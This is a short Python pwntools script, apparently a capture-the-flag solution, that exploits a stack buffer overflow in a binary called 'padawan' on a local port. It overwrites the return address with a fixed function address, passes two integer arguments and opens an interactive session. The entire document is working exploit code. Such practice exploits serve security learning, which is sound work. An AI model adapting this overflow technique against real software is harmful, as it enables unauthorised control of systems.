from pwn import *


elf = ELF('./padawan')
context.binary = elf

p = remote("localhost", 4446)

p.recvline()

payload =  b"a"*22
payload += p32(0x08049196)
payload += b"BBBB\xd2\x04\x00\x00\x2e\x16\x00\x00"

p.sendline(payload)
p.interactive()